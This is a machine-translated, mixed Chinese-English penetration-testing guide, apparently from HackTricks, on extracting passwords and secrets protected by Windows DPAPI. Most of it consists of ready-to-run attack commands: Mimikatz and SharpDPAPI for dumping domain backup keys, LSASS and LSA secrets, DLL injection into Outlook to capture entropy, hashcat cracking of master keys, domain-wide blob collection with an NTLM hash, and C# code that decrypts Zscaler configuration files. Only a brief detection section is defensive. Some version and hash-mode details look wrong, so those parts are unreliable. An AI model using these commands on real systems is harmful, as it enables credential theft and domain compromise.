# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

The Data Protection API (DPAPI) 主要在 Windows 操作系统中用于 **对非对称私钥进行对称加密**，利用用户或系统的秘密作为重要的熵源。此方法简化了开发者的加密工作，使他们可以使用从用户登录秘密派生的密钥（或用于系统加密时的系统域认证秘密）来加密数据，从而无需开发者自行管理加密密钥的保护。

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` 参数**，该参数也会在加密和解密过程中使用，因此要解密使用该参数加密的数据，必须提供在加密时使用的相同 `entropy` 值。

### 用户密钥生成

The DPAPI generates a unique key (called **`pre-key`**) for each user based on their credentials. 该密钥由用户密码及其他因素派生，算法取决于用户类型但最终为 SHA1。例如，对于域用户，**它取决于该用户的 NTLM hash**。

这一点尤其重要，因为如果攻击者能获取到用户的密码哈希，他们可以：

- **使用该用户的密钥解密任何使用 DPAPI 加密的数据**，而无需调用任何 API
- 尝试**离线破解密码**，以生成有效的 DPAPI 密钥

此外，每当用户使用 DPAPI 对数据进行加密时，都会生成一个新的 **主密钥**。这个主密钥才是实际用于加密数据的密钥。每个主密钥都有一个用于标识它的 **GUID**（全局唯一标识符）。

主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录下，其中 `{SID}` 是该用户的安全标识符。主密钥先后被用户的 **`pre-key`** 加密，并且还被一个用于恢复的 **域备份密钥 (domain backup key)** 加密（因此同一个密钥会以两种不同方式被加密存储两次）。

注意，**用于加密主密钥的域密钥存储在域控制器中并且不会改变**，因此如果攻击者能够访问域控制器，他们可以检索域备份密钥并解密域内所有用户的主密钥。

加密的 blob 在其头部包含用于加密数据的 **主密钥的 GUID**。

> [!TIP]
> DPAPI 加密的 blob 以 **`01 00 00 00`** 开头

查找主密钥：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

这是用于机器加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户可以访问的特殊密钥。该密钥用于加密需要由系统本身访问的数据，例如机器级别的凭证或系统范围的机密。

注意这些密钥 **没有域备份**，因此它们只能在本地访问：

- **Mimikatz** 可以通过导出 LSA secrets 来访问它，使用命令：`mimikatz lsadump::secrets`
- 该 secret 存储在注册表中，因此管理员可以 **修改 DACL 权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

DPAPI 保护的个人数据包括：

- Windows 凭证
- Internet Explorer 和 Google Chrome 的密码及自动填充数据
- 像 Outlook 和 Windows Mail 这样的应用的电子邮件和内部 FTP 帐户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和认证目的的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密 blob
- ...

系统保护的数据包括：
- Wifi 密码
- 计划任务密码
- ...

### Master key extraction options

- 如果用户具有域管理员权限，他们可以访问 **domain backup key** 来解密域内所有用户的 master keys：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 有了本地管理员权限，可以**访问 LSASS 内存**以提取所有已连接用户的 DPAPI 主密钥和 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户具有 local admin privileges，他们可以访问 **DPAPI_SYSTEM LSA secret** 来解密 machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知该用户的 password 或 hash NTLM，你可以**直接 decrypt 该用户的 master keys**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你以用户的会话身份，可以向 DC 请求 **backup key to decrypt the master keys using RPC**。如果你是 local admin 且用户已登录，可以为此 **steal his session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见用户 **受保护的文件** 位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也请在上述路径中将 `\Roaming\` 更改为 `\Local\` 进行检查。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中查找 DPAPI 加密的 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
请注意 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (来自同一仓库) 可用于使用 DPAPI 解密诸如 cookies 之类的敏感数据。

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话的 DPAPI 加密文件中获取凭据：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取 credentials 信息**，比如 encrypted data 和 guidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **访问 masterkeys**:

使用 RPC 对请求 **domain backup key** 的用户的 masterkey 进行解密：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
该 **SharpDPAPI** 工具还支持用于 masterkey 解密的这些参数（注意可以使用 `/rpc` 获取域的备份密钥，使用 `/password` 提供明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** 工具还支持这些用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的参数（注意可以使用 `/rpc` 获取域的备份密钥，使用 `/password` 提供明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 利用当前用户会话……）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 使用 **当前用户会话** 解密一些数据:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### 处理可选的 Entropy（"Third-party entropy"）

某些应用会向 `CryptProtectData` 传递一个额外的 **entropy** 值。没有该值，即使已知正确的 masterkey，blob 也无法被解密。因此，在针对以这种方式保护的凭证（例如 Microsoft Outlook、某些 VPN 客户端）时，获取该 **entropy** 至关重要。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) 是一个 user-mode DLL，它在目标进程内 hooks DPAPI 函数并透明地记录任何被提供的可选 **entropy**。以 **DLL-injection** 模式对诸如 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture，会输出一个将每个 **entropy** 缓冲区映射到调用进程和 blob 的文件。捕获到的 **entropy** 随后可以提供给 **SharpDPAPI**（/entropy:）或 **Mimikatz**（/entropy:<file>）以解密数据。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 离线破解主密钥 (Hashcat & DPAPISnoop)

Microsoft 在 Windows 10 v1607 (2016) 开始引入了 **context 3** 主密钥格式。`hashcat` v6.2.6 (December 2023) 增加了 hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) 和 **22102** (context 3)，允许通过 GPU 加速直接从主密钥文件破解用户密码。因此，攻击者可以在不与目标系统交互的情况下执行字典或暴力破解攻击。

`DPAPISnoop` (2024) 自动化该过程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential 和 Vault blobs，使用 cracked keys 对其解密并导出 cleartext passwords。

### 访问其他机器的数据

在 **SharpDPAPI 和 SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然你需要能够访问那台机器，下面的例子假定 **域备份加密密钥已知**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动化工具，用于从 LDAP 目录提取所有用户和计算机，并通过 RPC 提取域控制器的备份密钥。该脚本随后会解析所有计算机的 IP 地址，并对所有计算机执行 smbclient 以检索所有用户的 DPAPI blobs，并使用域备份密钥对其全部解密。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的计算机列表，你可以发现每个子网，即使你以前不知道它们！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动导出受 DPAPI 保护的秘密。2.x 版本引入了：

* 从数百台主机并行收集 blobs
* 解析 **context 3** masterkeys 并自动集成 Hashcat 破解
* 支持 Chrome "App-Bound" 加密 cookies（见下一节）
* 新增 **`--snapshot`** 模式，用于重复轮询端点并比较新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于 masterkey/credential/vault 文件的 C# 解析器，能够输出 Hashcat/JtR 格式并可选地自动调用破解。它完全支持到 Windows 11 24H1 的 machine 和 user masterkey 格式。


## 常见检测

- 访问位于 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 及其他与 DPAPI 相关的目录中的文件。
- 尤其是来自诸如 **C$** 或 **ADMIN$** 的网络共享。
- 使用 **Mimikatz**, **SharpDPAPI** 或类似工具访问 LSASS 内存或转储 masterkeys。
- 事件 **4662**：*对对象执行了操作* —— 可与访问 **`BCKUPKEY`** 对象相关联。
- 事件 **4673/4674**：当进程请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）

---
### 2023-2025 漏洞与生态系统变化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023)。具有网络访问权限的攻击者可以诱骗域成员检索恶意的 DPAPI 备份密钥，从而解密用户 masterkeys。该问题已在 2023 年 11 月的累积更新中修补 —— 管理员应确保 DCs 和工作站已打上所有补丁。
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) 用存放于用户 **Credential Manager** 下的附加密钥替代了仅依赖 DPAPI 的旧保护方式。离线解密 cookies 现在需要同时具备 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在以用户上下文运行时能够恢复该额外密钥。


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector 在 `C:\ProgramData\Zscaler` 下存放多个配置文件（例如 `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）。每个文件都使用 **DPAPI (Machine scope)** 加密，但厂商提供了 **custom entropy**，该熵是在 *运行时计算* 的，而不是存储在磁盘上。

该熵由两个元素重建：

1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码 secret。
2. 配置所属的 Windows 账户的 **SID**。

该 DLL 实现的算法等价于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
因为该秘密嵌入在可从磁盘读取的 DLL 中，**任何拥有 SYSTEM 权限的本地攻击者都可以为任何 SID 重新生成熵** 并离线解密这些 blobs：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption yields the complete JSON configuration, including every **device posture check** and its expected value – information that is very valuable when attempting client-side bypasses.

> 提示：其他被加密的工件 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) 使用 DPAPI **没有** 熵（`16` 个零字节）进行保护。因此，一旦获得 SYSTEM 权限，就可以直接使用 `ProtectedData.Unprotect` 对其进行解密。

## 参考资料

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
